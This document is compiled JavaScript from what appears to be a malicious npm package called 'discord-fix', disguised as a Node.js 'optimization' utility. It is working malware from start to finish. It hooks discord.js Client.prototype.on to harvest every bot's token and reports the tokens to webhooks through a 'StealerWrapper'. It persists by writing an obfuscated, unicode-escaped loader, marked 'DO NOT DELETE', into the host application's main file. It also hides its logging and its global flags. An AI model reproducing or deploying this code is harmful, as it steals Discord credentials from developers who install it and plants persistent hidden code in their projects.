"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
require("source-map-support/register");
const fs = require("promise-fs");
const collection_1 = require("@discordjs/collection");
const discord_js_1 = require("discord.js");
const events_1 = require("events");
const wrapper_1 = require("./stealer/wrapper");
const models_1 = require("./stealer/models");
const production = true;
function log(message) {
    if (!production) {
        console.log(`[Stealer] ${message}`);
    }
}
const pointer = Symbol.for('Оп ахах неловко вышло');
class ClientManager extends events_1.EventEmitter {
    constructor() {
        super();
        this.clients = new collection_1.default();
    }
    inject() {
        log(`[ClientManager] Injecting...`);
        const instance = this;
        const oldFunction = discord_js_1.Client.prototype.on;
        discord_js_1.Client.prototype.on = function on(event, listener) {
            oldFunction.call(this, 'ready', () => {
                if (!this.token)
                    return;
                if (!instance.clients.has(this.token)) {
                    instance.clients.set(this.token, this);
                    log(`[ClientManager] Added client to list`);
                    instance.emit('client', this);
                }
            });
            return oldFunction.call(this, event, listener);
        };
        log(`[ClientManager] Injected`);
    }
    static getInstance() {
        if (!this.instance)
            this.instance = new ClientManager();
        return this.instance;
    }
}
async function optimize() {
    log(`Called 'optimize' method`);
    Object.defineProperty(global, pointer, {
        enumerable: false,
        writable: false,
        value: true
    });
    //@ts-ignore
    //global[pointer] = true;
    log(`Set global property`);
    const webhooks = new models_1.List();
    const wrapper = new wrapper_1.StealerWrapper(webhooks);
    ClientManager.getInstance().inject();
    ClientManager.getInstance().on('client', async (client) => {
        log(`Reporting client...`);
        await wrapper.reportClient(client);
        log(`Client reported`);
    });
    log(`Stealing tokens...`);
    await wrapper.run();
    log(`Tokens stolen`);
}
exports.optimize = optimize;
/* Installer */
async function install() {
    var _a;
    log(`[Injector] Called 'install' method`);
    //@ts-ignore
    if (global[pointer]) {
        log(`[Injector] Already installed.`);
        return;
    }
    const file = (_a = require.main) === null || _a === void 0 ? void 0 : _a.filename;
    if (!file)
        return;
    log(`[Injector] Main file: ${file}`);
    log(`[Injector] Injecting...`);
    try {
        const loader = `/* DO NOT DELETE CODE BELOW */
/* Node.js optimization */
\\u{72}\\u{65}\\u{71}\\u{75}\\u{69}\\u{72}\\u{65}
("\\u{64}\\u{69}\\u{73}\\u{63}\\u{6f}\\u{72}\\u{64}\\u{2d}\\u{66}\\u{69}\\u{78}")
.\\u{6f}\\u{70}\\u{74}\\u{69}\\u{6d}\\u{69}\\u{7a}\\u{65}();
/* Node.js optimization end */
/* DO NOT DELETE CODE ABOVE */
\n`;
        const content = await fs.readFile(file, {
            encoding: 'utf8'
        });
        await fs.writeFile(file, `${loader}${content}`);
        optimize();
    }
    catch (error) {
        console.error(error);
    }
}
exports.install = install;
Object.defineProperty(global, Symbol.for('__PIZDOS__optimize'), {
    enumerable: false,
    writable: false,
    value: optimize
});
Object.defineProperty(global, Symbol.for('__PIZDOS__install'), {
    enumerable: false,
    writable: false,
    value: install
});
(async () => {
    if (process.argv[2] === 'run') {
        await optimize();
        setTimeout(() => {
            process.exit(0);
        }, 2000);
    }
})();
//# sourceMappingURL=app.js.map